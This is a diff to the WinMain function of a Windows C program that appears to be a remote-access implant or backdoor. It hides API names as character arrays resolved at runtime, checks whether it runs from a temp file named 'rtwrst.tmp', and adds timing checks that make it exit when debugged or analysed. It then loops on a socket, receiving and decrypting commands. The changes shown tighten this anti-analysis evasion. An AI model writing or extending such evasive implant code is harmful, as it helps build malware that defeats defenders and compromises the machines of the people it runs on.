@@ -439,18 +439,24 @@ WinMain(HINSTANCE hInstance,
 		LPSTR lpCmdLine,
 		int nCmdShow)
 {
+ 	char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
+	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
+	
 #if !DEBUG	
 	LONGLONG cycleCountDiff;
 	LARGE_INTEGER performanceCounterStart;
 	LARGE_INTEGER performanceCounterCurrent;
 	LARGE_INTEGER performanceFrequency;
 
-	QueryPerformanceFrequency(&performanceFrequency);
-	QueryPerformanceCounter(&performanceCounterStart);
+	char ca_QueryPerformanceFrequency[] = { 'Q','u','e','r','y','P','e','r','f','o','r','m','a','n','c','e','F','r','e','q','u','e','n','c','y',0 };
+	_QueryPerformanceFrequency* f_QueryPerformanceFrequency = (_QueryPerformanceFrequency*)GetProcAddress(gLibraryKernel32, ca_QueryPerformanceFrequency);
+	f_QueryPerformanceFrequency(&performanceFrequency);
+
+	char ca_QueryPerformanceCounter[] = { 'Q','u','e','r','y','P','e','r','f','o','r','m','a','n','c','e','C','o','u','n','t','e','r',0 };
+	_QueryPerformanceCounter* f_QueryPerformanceCounter = (_QueryPerformanceCounter*)GetProcAddress(gLibraryKernel32, ca_QueryPerformanceCounter);
+	f_QueryPerformanceCounter(&performanceCounterStart);
 #endif	
 	
-	char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
-	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
 	
 	char currentPath[MAX_PATH];
 	if ( GetModuleFileNameA(NULL, currentPath, MAX_PATH) == 0 )
@@ -472,7 +478,8 @@ WinMain(HINSTANCE hInstance,
 	char ca_tmpName[] = { 'r','t','w','r','s','t','.','t','m','p',0 };
 	strncat_s(execPath, ca_tmpName, 9);
 
-#if DEBUG	
+#if DEBUG
+// #if !DEBUG	
 	if ( 0 )
 #else
 	if ( strcmp(currentPath, execPath) != 0 )
@@ -510,20 +517,16 @@ WinMain(HINSTANCE hInstance,
 	gf_CloseHandle = (_CloseHandle*)GetProcAddress(gLibraryKernel32, ca_CloseHandle);
 
 #if !DEBUG
-	QueryPerformanceCounter(&performanceCounterCurrent);
+	f_QueryPerformanceCounter(&performanceCounterCurrent);
 	cycleCountDiff = (performanceCounterCurrent.QuadPart - performanceCounterStart.QuadPart) / performanceFrequency.QuadPart;
-	if ( cycleCountDiff > 1 )
+	if ( cycleCountDiff > 3 )
 		return 1;
-
-	char buffer[256];
-	sprintf_s(buffer, "%I64d\n", cycleCountDiff);
-	OutputDebugStringA(buffer);
 #endif	
 	
 	for(;;)
 	{
 #if !DEBUG
-		QueryPerformanceCounter(performanceCounterStart);
+		f_QueryPerformanceCounter(&performanceCounterStart);
 #endif		
 		
 		WSADATA wsaData;
@@ -600,9 +603,14 @@ WinMain(HINSTANCE hInstance,
 		}
 
 #if !DEBUG
-		QueryPerformanceCounter(performanceCounterCurrent);
-		cycleCountDiff = performanceCounterCurrent.QuadPart - performanceCounterStart.QuadPart;		
-		if ( cycleCountDiff > 1 )
+		f_QueryPerformanceCounter(&performanceCounterCurrent);
+		cycleCountDiff = (performanceCounterCurrent.QuadPart - performanceCounterStart.QuadPart) / performanceFrequency.QuadPart;
+
+		char buffer[256];
+		sprintf_s(buffer, "Checking: %ld\n", cycleCountDiff);
+		OutputDebugStringA(buffer);
+		
+		if ( cycleCountDiff > 20 )
 			return 1;
 #endif		
 	}
@@ -637,7 +645,7 @@ WinMain(HINSTANCE hInstance,
 #endif			
 		}
 #if !DEBUG
-		QueryPerformanceCounter(performanceCounterStart);
+		f_QueryPerformanceCounter(&performanceCounterStart);
 #endif		
 
 		EncryptDecryptString(recvBuffer, SOCKET_BUFFER_SIZE);
@@ -690,9 +698,9 @@ WinMain(HINSTANCE hInstance,
 		OutputDebugStringA("\n");
 
 #if !DEBUG
-		QueryPerformanceCounter(performanceCounterCurrent);
-		cycleCountDiff = performanceCounterCurrent.QuadPart - performanceCounterStart.QuadPart;		
-		if ( cycleCountDiff > 1 )
+		f_QueryPerformanceCounter(&performanceCounterCurrent);
+		cycleCountDiff = (performanceCounterCurrent.QuadPart - performanceCounterStart.QuadPart) / performanceFrequency.QuadPart;		
+		if ( cycleCountDiff > 3 )
 			return 1;
 
 #endif		
